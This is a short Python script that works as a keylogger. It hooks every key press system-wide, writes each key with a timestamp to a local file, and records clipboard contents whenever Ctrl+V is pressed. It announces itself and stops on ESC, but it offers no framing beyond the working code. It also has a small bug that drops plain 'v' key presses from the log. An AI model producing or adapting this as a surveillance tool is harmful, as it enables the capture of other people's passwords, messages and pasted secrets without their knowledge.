import keyboard
import pyperclip
from datetime import datetime

def on_key(event):
    if event.event_type == "down":
        with open("keystrokes.txt", "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
            f.write(timestamp)
            if event.name == "space":
                f.write(" ")
            elif event.name == "enter":
                f.write("\n")
            elif event.name == "ctrl" or event.name == "v":
                # Check for paste event (Ctrl+V)
                if keyboard.is_pressed("ctrl") and keyboard.is_pressed("v"):
                    clipboard_content = pyperclip.paste()
                    f.write(f"[PASTE: {clipboard_content}]")
            else:
                f.write(event.name)
            f.write("\n")  # Add a newline after each key event

keyboard.hook(on_key)
print("Logging keystrokes and clipboard (Ctrl+V). Press ESC to stop.")
keyboard.wait("esc")